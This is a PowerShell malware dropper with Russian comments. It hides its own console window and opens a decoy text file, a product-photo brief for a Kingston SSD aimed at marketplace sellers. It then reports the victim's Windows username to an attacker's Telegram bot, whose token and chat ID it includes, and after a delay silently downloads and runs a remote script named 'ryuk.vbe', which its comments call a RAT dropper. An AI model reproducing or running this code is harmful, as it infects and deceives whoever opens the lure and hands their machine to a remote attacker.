# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "TZKingston XS2000 BOC 2000 ГБ .txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Задача: подготовить 6–7 профессиональных фотоснимков твердотельного накопителя Kingston XS2000 BOC объемом 2000 ГБ (SXS2000/2000GA, 2TB, серебристый) для размещения на маркетплейсах Ozon и Wildberries. Требуемый стиль: минимализм, акцент на технологичности, чистота. Необходимо подчеркнуть портативность, скорость (2000 МБ/с), надежность и малые габариты устройства.
Все необходимые фотографии товара и его упаковки доступны в папке (включая SSD, кабель из комплекта, защитный чехол и коробку).

ФОТО 1 – Основной снимок (вид спереди)
Фон должен быть однотонным, белым или нейтральным, без каких-либо артефактов.
В кадре – только SSD (лицевая сторона), с четко видимым логотипом Kingston и текстурой металла.
Фокус на корпусе, мягкий свет, избегать бликов.
Размер изображения – в соответствии с требованиями Ozon/WB.
ФОТО 2 – SSD в 3D-ракурсе / перспективе
Использовать одну из предложенных фотографий, показывающую устройство под углом (например, фото №1).
Подчеркнуть форму, материалы и толщину накопителя.
Небольшая тень под объектом для придания реалистичности.
ФОТО 3 – Порт и интерфейс (USB-C) крупным планом
Максимально четкое и детализированное изображение разъема.
Обозначить совместимость: USB-C, USB 3.2 Gen 2×2.
Соблюдать строгий, технический стиль.
ФОТО 4 – Комплектация
Поместить в кадр SSD, защитный чехол и кабель (как на фото №2).
Аккуратно расположить компоненты, соблюдая симметрию.
Добавить текст: “В комплекте: SSD, кабель USB-C, чехол”.
ФОТО 5 – Упаковка (коробка)
Использовать фотографию коробки (фото №5).
Изображение человека на коробке уже скрыто – оставить как есть, не требуется дополнительная обработка.
Фон – ровный белый, выполнить незначительную коррекцию.
Этот снимок необходим для подтверждения подлинности продукта.
ФОТО 6 – Инфографика: «Ключевые особенности»
На белом фоне разместить фото SSD (можно использовать фронтальный вид).
Добавить 4–6 иконок с подписями:
Скорость чтения 2000 МБ/с
Скорость записи 2000 МБ/с
Интерфейс USB 3.2
Объем 2 ТБ
Ударопрочный корпус
Текст должен быть лаконичным и четким.
ФОТО 7 – Габариты и вес / компактность
На белом фоне показать устройство рядом с силуэтом руки (без самой руки) или линейкой.
Указать размеры: 69.54×32.58×13.5 мм
Указать вес: 28.9 г
Добавить подпись: “Ультракомпактный: легко помещается в карман”.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}



exit
